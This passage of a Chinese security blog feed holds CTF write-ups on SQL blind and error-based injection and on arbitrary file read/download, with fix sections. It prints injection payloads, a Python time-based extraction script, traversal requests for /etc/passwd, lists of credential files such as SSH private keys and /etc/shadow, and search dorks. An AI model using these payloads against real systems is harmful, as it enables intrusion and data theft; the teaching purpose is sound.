table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;107),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;106),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;105),sleep(5),1)--+正常</code></pre><p>所以user_3表的第一个字段的字段名的第一个字符ASCII码为105，即“i”。<br>依次猜解,最终得到user_3表的3个字段名分别为：<code>id</code> <code>username</code> <code>password</code></p></li></ul><p>3.猜数据</p><ul><li><p>猜数据长</p><pre><code class="sql">&#39;&quot; or if((length((select password from challenges.user_3 limit 1,1))=25),sleep(5),1)--+延迟5秒</code></pre><p>所以user_3表的password字段的第2条数据的数据长度为25，这个应该就是flag那条数据了</p></li><li><p>猜数据值</p><pre><code class="sql">&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;32),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;128),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;80),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;104),sleep(5),1)--+正常&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;92),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;98),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;101),sleep(5),1)--+延迟5秒&#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;102),sleep(5),1)--+正常</code></pre><p>说明user_3表的password字段的第2条数据(limit 1,1意思是从1开始取(即第二条数据)，取一条数据。)的数据值的第一个字符ASCII码为102，即“f”。<br>依次猜解,最终得到flag</p></li></ul><h4 id="简便之法-BurpSuite半自动化盲注-1"><a href="#简便之法-BurpSuite半自动化盲注-1" class="headerlink" title="简便之法-BurpSuite半自动化盲注"></a>简便之法-BurpSuite半自动化盲注</h4><p>和布尔盲注一样，时间盲注是不是也可以进行构造payload，并设置变量进行爆破呢？发现与布尔盲注不同之处就是使用了sleep()和if()。并且对爆破结果要根据返回时间进行整理排序。<br>1、爆库<br>payload</p><pre><code class="sql">&quot; or if((ascii(substr(database(),§1§,1))=§32§),sleep(5),1)--+</code></pre><ol><li><p>先随便输入用户名和密码，然后BurpSuite抓包，发送到Intruder<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813004830-03a339f6-bd21-1.jpg" alt></p></li><li><p>设置Positions<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813004911-1c5cf446-bd21-1.jpg" alt></p></li><li><p>设置两个变量的爆破类型<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813005009-3ec5b3e2-bd21-1.jpg" alt><br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813005024-4791b584-bd21-1.jpg" alt></p></li><li><p>开始爆破，根据返回时间确定爆破结果<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813005056-5ad34cf2-bd21-1.jpg" alt><br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813005114-652b37be-bd21-1.jpg" alt><br> 凡是Timer&gt;10000的payload2即为数据库名的每个字符的ASCII</p></li><li><p>排序、转换字符<br> Timer&gt;10000的payload2每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名<br> <img src="http://xzfile.aliyuncs.com/media/upload/picture/20190812204433-ef16fb0c-bcfe-1.jpg" alt></p></li></ol><p>2、爆表<br>payload</p><pre><code class="sql">&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§32§),sleep(5),1)--+</code></pre><p>与爆库的不同之处就是payload和结果长度(结果长度由10改为6)。然后开始爆破，根据返回时间确定爆破结果。<br>最后排序、转换字符。最后得到表名为：<code>user_3</code></p><p>3、爆字段<br>payload</p><pre><code class="sql">&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 2,1),§1§,1))=§32§),sleep(5),1)--+</code></pre><p>上述payload爆第三个字段，与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8)。<br>然后开始爆破，根据返回时间确定爆破结果。最后排序、转换字符，得到第三个字段为：<code>password</code></p><p>3、爆数据<br>payload</p><pre><code class="sql">&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),§1§,1))=§32§),sleep(5),1)--+</code></pre><p>与爆库的不同之处就是payload和结果长度，改一下(结果长度改为25)。然后开始爆破，根据返回时间确定爆破结果。<br>最后排序、转换字符，得到最终flag。<br><strong>提高效率</strong><br>当然时间盲注也可以用布尔盲注的那种方法提高效率，即选择不使用ascii()函数。与布尔盲注不同之处是使用了sleep()函数和if(expr1,expr2,expr3)函数。<br>####神来之笔-脚本盲注<br>和布尔盲注一样，是不是也可以写一个时间盲注脚本来提高效率呢？于是想到用python里的time.time()函数，返回当前时间的时间戳。记录提交和返回过程的时间差，然后进行判断。时间盲注脚本如下：</p><pre><code class="python">import requestsimport timeimport stringimport syschars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39;url=&quot;http://35.201.188.231:9000/challenge-03/post.php&quot;dbname=&#39;&#39;payload=&quot;&#39;\&quot; or if((ascii(substr(database(),{0},1))={1}),sleep(5),1) #&quot;print(&quot;数据库名：&quot;,dbname)#payload=&quot;&#39;\&quot;or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}),sleep(5),1) #&quot;#print(&quot;数据表名：&quot;,dbname)#payload=&quot;&#39;\&quot;or if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;user_3&quot; limit 1,1),{0},1))={1}),sleep(5),1) #&quot;#print(&quot;字段名：&quot;,dbname)#payload=&quot;&#39;\&quot; or if((ascii(substr((select password from user_3 limit 1,1),{0},1))={1}),sleep(5),1) #&quot;#print(&quot;数据：&quot;,dbname)for i in range(1,40):    char=&#39;&#39;    for x in chars:        char_ascii=ord(x)        payloads=payload.format(i,char_ascii)        start=time.time()        postdata={            &#39;username&#39;:payloads,            &#39;password&#39;:&#39;admin&#39;        }        r=requests.post(url,data=postdata)        if (time.time() - start)&gt;=5:            dbname+=x            print(dbname)            char=x            break    if char==&#39;&#39;:        break</code></pre><p>测试一下<br><img src="http://xzfile.aliyuncs.com/media/upload/picture/20190813193259-1a4f83e2-bdbe-1.jpg" alt><br>同样如果传参方式是get传参，只需在url后添加<code>? 参数名=</code>，再将requests.post改成requests.get即可。</p><h2 id="SQL盲注的利用"><a href="#SQL盲注的利用" class="headerlink" title="SQL盲注的利用"></a>SQL盲注的利用</h2><p>在一些SQL注入中往往有用到SQL盲注的方法，进行猜解数据库信息。比如在order by排序注入中，利用基于时间盲注的方法。</p><pre><code class="sql">select * from users order by id desc;</code></pre><p>因为desc是可控的传参值。所以可进行注入<br>基于时间盲注</p><pre><code class="sql">?order=if(1=1,1,sleep(5)) 正常响应时间?order=if(1=2,1,sleep(5)) 延迟5秒</code></pre><h2 id="SQL盲注漏洞的修复方案"><a href="#SQL盲注漏洞的修复方案" class="headerlink" title="SQL盲注漏洞的修复方案"></a>SQL盲注漏洞的修复方案</h2><p>SQL盲注的危害大家也都看到了，但是我们该如何防止这种情况的发生呢？<br>简单来讲，就是永远不要相信用户的输入。所以要对请求进行过滤，对参数进行验证，对非法字符进行拦截替换，清理用户输入的危险字符，保证sql能够在数据库中正确的编译和执行。这便是解决SQL盲注的简单思路。</p><p>当然，还有另一种方法，就是不使用SQL拼接语句。先在后台进行SQL查询，然后将查询结果与用户输入进行比对。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从两道SQL盲注的CTF题中，明白SQL盲注的三种解法，以及SQL盲注的危害和利用。同时也想到一些修复方案。<br>总之收获很大。但本人文采有限，操作生疏。若有任何不当之处，还望各位师傅指出。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>任意文件读取与下载漏洞</title>
      <link href="/2019/10/19/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/10/19/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h3><p>上周参加了一个线上赛。有个Web题的WriteUp说是任意文件下载。由于之前没学过，所以就没有想到。现在学习一下</p><h3 id="0x01为什么产生任意文件读取与下载漏洞"><a href="#0x01为什么产生任意文件读取与下载漏洞" class="headerlink" title="0x01为什么产生任意文件读取与下载漏洞"></a>0x01为什么产生任意文件读取与下载漏洞</h3><p> 一些网站的业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源文件，敏感文件等等。</p><h3 id="0x02任意文件读取漏洞"><a href="#0x02任意文件读取漏洞" class="headerlink" title="0x02任意文件读取漏洞"></a>0x02任意文件读取漏洞</h3><p>任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。<br><strong>漏洞产生原因</strong></p><ul><li>存读取文件的函数</li><li>读取文件的路径用户可控，且未校验或校验不严</li><li>输出了文件内容</li></ul><p><strong>任意文件读取</strong></p><pre><code class="php">&lt;?php            $filename=”test.txt”;readfile($filename);?&gt;</code></pre><pre><code class="php">&lt;?php$filename=”test.txt”;echo file_get_contents($filename);?&gt;</code></pre><p><strong>文件读取函数</strong><br><code>readfile()</code>、<code>file_get_contents()</code>、<code>fopen()</code>中，<code>$filename</code>没有经过校验或者校验不合格，用户可控制变量读取任意文件，如<code>/etc/passwd</code>、<code>./index.php</code>、<code>/config.ini</code>。</p><h3 id="0x03任意文件下载漏洞"><a href="#0x03任意文件下载漏洞" class="headerlink" title="0x03任意文件下载漏洞"></a>0x03任意文件下载漏洞</h3><p>一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。<br><strong>漏洞产生原因</strong></p><ul><li>有读取文件的函数</li><li>读物文件的路径用户可控，且没有经过校验，或者校验不严格</li><li>输出文件内容</li><li>一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字</li></ul><p><strong>文件下载的两种方式</strong><br>1、直接下载：</p><pre><code class="html">&lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt;</code></pre><p>2、增加header头</p><pre><code class="php">&lt;?php    $filename = $_GET[&#39;filename&#39;];    echo &#39;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#39;;    echo file_get_contents($filename);    header(&#39;Content-Type: imgage/jpeg&#39;);    header(&#39;Content-Disposition: attachment; filename=&#39;.$filename);    header(&#39;Content-Lengh: &#39;.filesize($filename));?&gt;</code></pre><h4 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h4><p><img src="http://img-blog.csdnimg.cn/20181201093159718.jpeg" alt><br><strong>利用思路</strong></p><ul><li>下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置</li><li>下载各种<code>.log</code>文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。</li><li>下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。</li></ul><p>尝试读取<code>/root/.bash_history</code>看自己是否具有root权限。<br>如果没有，就只能利用<code>../</code>来回跳转读取一些<code>.ssh</code>下的配置信息文件。<br>读取mysql下的<code>.bash_history</code>文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。</p><p><strong>一些常见利用方式</strong></p><h5 id="java-oracle环境"><a href="#java-oracle环境" class="headerlink" title="java+oracle环境"></a>java+oracle环境</h5><p>可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器。</p><p>也可以先下载网站的配置文件，在根目录/WEB-INF/Web.xml的(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)。</p><h5 id="具有root权限"><a href="#具有root权限" class="headerlink" title="具有root权限"></a>具有root权限</h5><p>在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。</p><p>当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞将mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。<br><strong>locate 读取方法</strong></p><pre><code class="bash">locate mlocate.db admin</code></pre><p>可以将<code>mlocate.db</code>中包含<code>admin</code>内容全部输出来。<br><img src="http://img-blog.csdnimg.cn/20191018231013532.jpg" alt="在这里插入图片描述"><br>利用这个文件可以获取到该服务器任何我们想要的内容并下载出来而不用一个一个去猜解目录，但是这个文件只有root用户才能读取。另一方面我们也可以利用linux内核的一个文件<code>/proc/self/cmdline</code>当前进程的<code>cmdline</code>参数，可以获取到路径信息。</p><p>总的来说，任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。</p><h3 id="0x04任意文件读取与下载漏洞挖掘"><a href="#0x04任意文件读取与下载漏洞挖掘" class="headerlink" title="0x04任意文件读取与下载漏洞挖掘"></a>0x04任意文件读取与下载漏洞挖掘</h3><blockquote><p>1、web漏洞扫描器（awvs、appscan、openvas、nessus）<br>2、手动挖掘从连接和参数名查看</p></blockquote><p><em>Google search</em></p><pre><code class="bash">inurl:”readfile.php?file=inurl:”read.php?filename=inurl:”download.php?file=inurl:”down.php?file=</code></pre><p>连接：<br><code>readfile.php?file=**.txt</code><br><code>download.php?file=**.rar</code><br>参数名：<br><code>&amp;RealPath=</code>、<code>&amp;readpath=</code>、<code>&amp;FilePath=</code>、<code>&amp;filepath=</code>、<code>&amp;Path=</code>、<code>&amp;path=</code>、<code>&amp;Inputfile=</code>、<code>&amp;inputfile=</code>、<code>&amp;url=</code>、<code>&amp;urls=</code>、<code>&amp;Lang=</code>、<code>&amp;dis=</code>、<code>&amp;Data=</code>、<code>&amp;data=</code>、<code>&amp;readfile=</code>、<code>&amp;ﬁlep=</code>、<code>&amp;Src=</code>、<code>&amp;src=</code>、<code>&amp;menu=</code>、<code>META-INF=</code> 、<code>WEB-INF</code></p><h3 id="0x05敏感信息"><a href="#0x05敏感信息" class="headerlink" title="0x05敏感信息"></a>0x05敏感信息</h3><p><strong>Windows：</strong></p><blockquote><p>C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息</p></blockquote><p><strong>Linux：</strong></p><blockquote><p>/root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br>/root/.ssh/id_rsa  //ssh私钥,ssh公钥是id_rsa.pub<br>/root/.ssh/id_ras.keystore  //记录每个访问计算机用户的公钥<br>/root/.ssh/known_hosts<br>//ssh会把每个访问过计算机的公钥(public key)都记录在~/.ssh/known_hosts。当下次访问相同计算机时，OpenSSH会核对公钥。如果公钥不同，OpenSSH会发出警告， 避免你受到DNS Hijack之类的攻击。<br>/etc/passwd  // 账户信息<br>/etc/shadow  // 账户密码文件<br>/etc/my.cnf  //mysql 配置文件<br>/etc/httpd/conf/httpd.conf  // Apache配置文件<br>/root/.bash_history     //用户历史命令记录文件<br>/root/.mysql_history    //mysql历史命令记录文件<br>/proc/self/fd/fd[0-9]*(文件标识符)<br>/proc/mounts     //记录系统挂载设备<br>/porc/config.gz   //内核配置文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/porc/self/cmdline //当前进程的cmdline参数</p></blockquote><h3 id="0x06任意文件读取与下载漏洞验证"><a href="#0x06任意文件读取与下载漏洞验证" class="headerlink" title="0x06任意文件读取与下载漏洞验证"></a>0x06任意文件读取与下载漏洞验证</h3><h4 id="任意文件读取验证"><a href="#任意文件读取验证" class="headerlink" title="任意文件读取验证"></a>任意文件读取验证</h4><p>示例代码：</p><pre><code class="php">&lt;?php$filename=$_GET[&#39;f&#39;];echo file_get_contents($filename);?&gt;</code></pre><p>测试：</p><pre><code class="php">readfile.php?f=../../../../../../etc/passwdreadfile.php?file=../../../../../../../../etc/passwd%00</code></pre><p><img src="http://img-blog.csdnimg.cn/20191018225207994.jpg" alt="在这里插入图片描述"></p><pre><code class="php">readfile.php?f=../index.txt</code></pre><p><img src="http://img-blog.csdnimg.cn/20191018230501272.jpg" alt="在这里插入图片描述"><br><code>file://</code>伪协议 ，读取文件内容</p><pre><code class="php">readfile.php?f=file:///etc/passwd</code></pre><p><img src="http://img-blog.csdnimg.cn/20191018225452572.jpg" alt="在这里插入图片描述"></p><h4 id="任意文件下载验证"><a href="#任意文件下载验证" class="headerlink" title="任意文件下载验证"></a>任意文件下载验证</h4><p>示例代码：</p><pre><code class="php">&lt;?php$filename = $_GET[&#39;f&#39;];echo &#39;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#39;;echo file_get_contents($filename);header(&#39;Content-Type: imgage/jpeg&#39;);header(&#39;Content-Disposition: attachment; filename=&#39;.$filename);header(&#39;Content-Lengh: &#39;.filesize($filename));?&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20191018234242991.jpg" alt="在这里插入图片描述"><br>当然，我下载这个文件并没有内容。</p><h3 id="0x07漏洞判断"><a href="#0x07漏洞判断" class="headerlink" title="0x07漏洞判断"></a>0x07漏洞判断</h3><p>参数<code>f</code>的参数值为PHP文件时：</p><blockquote><p>1.文件被解析，则是文件包含漏洞<br>2.显示源代码，则是文件查看漏洞<br>3.提示下载，则是文件下载漏洞</p></blockquote><h3 id="0x08漏洞防御修复"><a href="#0x08漏洞防御修复" class="headerlink" title="0x08漏洞防御修复"></a>0x08漏洞防御修复</h3><p><strong>通用</strong></p><ul><li>过滤 <code>.</code> 点，使用户在url中不能回溯上级目录</li><li>正则严格判断用户输入的参数</li><li><code>php.ini</code>配置<code>open_basedir</code>限定文件访问范围</li></ul><p><strong>文件下载漏洞修复</strong></p><ul><li>将下载区独立出来，放在项目路径外，给每个下载资源固定的URL，而不是所有的下载资源都是统一的URL：<code>http://www.test.com/download?filename=文件名</code></li><li>净化数据：对用户传过来的文件名参数进行硬编码或统一编码，对文件类型进行白名单控制，对包含恶意字符或者空字符的参数进行拒绝。</li><li>web应用程序可以使用chroot环境包含被访问的web目录，或者使用绝对路径+参数来访问文件目录，时使其即使越权也在访问目录之内。www目录就是一个chroot应用。由chroot创造出的那个根目录，叫做“chroot监狱”(所谓”监狱”就是指通过chroot机制来更改某个进程所能看到的根目录，即将某进程限制在指定目录中，保证该进程只能对该目录及其子目录的文件有所动作，从而保证整个服务器的安全。<br>详细具体chroot的用法，可参考：<code>http://blog.csdn.net/frozen_fish/article/details/2244870</code></li><li>任意文件下载漏洞也有可能是web所采用的中间件的版本低而导致问题的产生，例如ibm的websphere的任意文件下载漏洞，需更新其中间件的版本可修复。</li><li>要下载的文件地址保存至数据库中。<ul><li>文件路径保存至数据库，让用户提交文件对应ID下载文件。</li><li>用户下载文件之前需要进行权限判断。</li><li>文件放在web无法直接访问的目录下。</li><li>不允许提供目录遍历服务。</li><li>公开文件可放置在web应用程序下载目录中通过链接进行下载。</li><li>记录文件下载日志。</li></ul></li></ul><h3 id="0x09漏洞利用实战"><a href="#0x09漏洞利用实战" class="headerlink" title="0x09漏洞利用实战"></a>0x09漏洞利用实战</h3><p>我学习任意文件读取与下载漏洞，就是因为遇到了一个任意文件读取与下载漏洞的Web题，所以在此实战一下<br><strong>RoarCTF2019-Web：Easy Java</strong><br><img src="http://img-blog.csdnimg.cn/20191019003355433.jpg" alt="在这里插入图片描述"><br>不是弱口令，也不能扫出目录。只有一个<code>help.docx</code>文件可以下载。于是可能是任意文件下载漏洞。<br>点击蓝字“help”，抓包，发包。发现GET方式一直什么都下载不了。后来修改为POST，就可以下载了。<br><img src="http://img-blog.csdnimg.cn/20191019004142728.jpg" alt="在这里插入图片描述"><br>因为题目提示java，所以可以先下载网站的配置文件，在根目录<code>WEB-INF/web.xml</code><br><img src="http://img-blog.csdnimg.cn/20191019004823576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现操作flag的关键文件位置，读取(或下载)<code>/WEB-INF/classes/</code>下的flag的关键文件位置，又因为Java字节码类文件（<code>.class</code>）是Java编译器编译Java源文件（<code>.java</code>）产生的“目标文件”。<br>最终得出flag的关键文件位置为：<code>/WEB-INF/classes/com/wm/ctf/FlagController.class</code><br><img src="http://img-blog.csdnimg.cn/20191019005624494.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Base64解码得到flag<br><img src="http://img-blog.csdnimg.cn/20191019005704555.jpg" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件操作漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题目复现 </tag>
            
            <tag> 任意文件读取漏洞 </tag>
            
            <tag> 任意文件下载漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-报错注入</title>
      <link href="/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前没有对SQL报错注入详细总结过，总结一下。</p><h3 id="SQL报错注入"><a href="#SQL报错注入" class="headerlink" title="SQL报错注入"></a>SQL报错注入</h3><p><strong>利用前提</strong>: 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()<br><strong>优点</strong>: 不需要显示位<br><strong>缺点</strong>: 需要输出 mysql_error( )的报错信息</p><h3 id="12种SQL报错注入语句"><a href="#12种SQL报错注入语句" class="headerlink" title="12种SQL报错注入语句"></a>12种SQL报错注入语句</h3><p>1、通过floor报错,注入语句如下:</p><pre><code class="sql">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p>2、通过extractvalue报错,注入语句如下:</p><pre><code class="sql"> and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</code></pre><p>3、通过updatexml报错,注入语句如下:</p><pre><code class="sql">and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></pre><p>4、通过exp报错,注入语句如下:</p><pre><code class="sql">and exp(~(select * from (select user () ) a) );</code></pre><p>5、通过join报错,注入语句如下:</p><pre><code class="sql">select * from(select * from mysql.user ajoin mysql.user b)c;</code></pre><p>6、通过NAME_CONST报错,注入语句如下:</p><pre><code class="sql">and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c);</code></pre><p>7、通过GeometryCollection()报错,注入语句如下:</p><pre><code class="sql">and GeometryCollection(()select *from(select user () )a)b );</code></pre><p>8、通过polygon ()报错,注入语句如下:</p><pre><code class="sql">and polygon (()select * from(select user ())a)b );</code></pre><p>9、通过multipoint ()报错,注入语句如下:</p><pre><code class="sql">and multipoint (()select * from(select user() )a)b );</code></pre><p>10、通过multlinestring ()报错,注入语句如下:</p><pre><code class="sql">and multlinestring (()select * from(selectuser () )a)b );</code></pre><p>11、通过multpolygon ()报错,注入语句如下:</p><pre><code class="sql">and multpolygon (()select * from(selectuser () )a)b );</code></pre><p>12、通过linestring ()报错,注入语句如下:</p><pre><code class="sql">and linestring (()select * from(select user() )a)b );</code></pre><h3 id="mysql-常用函数"><a href="#mysql-常用函数" class="headerlink" title="mysql 常用函数"></a>mysql 常用函数</h3><p><strong>系统信息函数</strong></p><p><code>database()</code>   返回当前数据库名<br><code>user()</code>或<code>system_user()</code>  返回当前登陆用户名<br><code>version()</code> 或<code>@@version</code>  返回MySQL服务器的版本<br><code>benchmapk(count,expr)</code>  将表达式expr重复运行count次<br><code>connection_id()</code>   返回当前客户的连接ID<br><code>found_rows()</code>   返回最后一个SELECT查询进行检索的总行数<br><code>session_user()</code>    连接数据库的用户名<br><code>current_user</code>  当前用户名<br><code>load_file()</code>   读取本地文件<br><code>@@datadir</code> 读取数据库路径<br><code>@@basedir</code> mysql安装路径<br><code>@@version_complie_os</code>  查看操作系统</p><p>更多参考：<a href="https://blog.csdn.net/william_n/article/details/100827828" target="_blank" rel="noopener">mysql 常用函数收集</a></p><h3 id="常见SQL报错注入"><a href="#常见SQL报错注入" class="headerlink" title="常见SQL报错注入"></a>常见SQL报错注入</h3><p>SQL注入有12个报错方式，比较常见的有floor报错注入、extractvalue报错注入、updatexml报错注入和exp报错注入</p><h4 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h4><p>floor报错注入是利用 count()函数 、rand()函数 、floor()函数 、group by 这几个特定的函数结合在一起产生的注入漏洞。缺一不可</p><pre><code class="sql">select * from users where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p>x和a是起的别名。</p><ol><li><strong>floor报错注入相关函数</strong><br> <a href="https://www.w3school.com.cn/sql/sql_func_count.asp" target="_blank" rel="noopener">count() 函数</a><br> <strong>count(*) 函数</strong>：返回表中的记录数<br> 报错注入中，floor(rand(0)<em>2)报错是有条件的，记录必须3条以上。所以使用count(\</em>) 函数<br> <strong>floor()函数</strong>：返回小于等于该值的最大整数（可以理解为向下取整，只保留整数部分）<br> <a href="https://www.cnblogs.com/aiyr/p/6830593.html" target="_blank" rel="noopener">concat()函数</a>：字符串拼接<br> 报错注入中，利用concat()函数将想要获得的数据库内容拼接到concat()中，报错时作为内容输出。<br> <strong>rand()函数</strong>：可以用来生成0或1<br> <strong>rand(0)函数</strong>：也可以用来生成0或1<br> <code>group by a</code>  会根据a的规则对数据进行分组,而分组的时候,mysql会建立一个临时空表进行分组.</li><li><strong>floor(rand(0)*2)，乘以 2的原因</strong><br> rand() 是返回 0 到 1 之间的随机数（即使用floor()后，只可以返回0）,<br> 那么乘 2 后自然是返回 0 到 2 之间的随机数（即使用floor()后，可以返回0和1）</li></ol><p><img src="http://img-blog.csdnimg.cn/20190924005403948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="3"><li><strong>rand(0)函数和rand()函数的区别</strong><br>rand(0)相当于给rand()函数传递了一个参数，然后rand()函数会根据0这个参数进行随机数生成。rand()生成的数字是完全随机的，而rand(0)是有规律的生成。</li></ol><p><img src="http://img-blog.csdnimg.cn/20190924005811970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190924005822715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="4"><li><strong>报错分析</strong><br>rand()函数在查询的时候会执行一次，插入的时候还会执行一次（即使用rand()的话，会执行多次）。这是整个语句报错的关键<br><code>floor(rand(0)*2)</code> 前六位是011011。<br> <code>group by a</code>先建立一个空表，用于分组，然后进行分组查询。</li></ol><p>第一次rand()执行，查询的结果是0。于是需要插入分组，就在这时，<code>floor(rand(0)*2)</code>再次被触发，生成第二个值 1 ，因此最终插入虚拟表的也就是第二个值 1 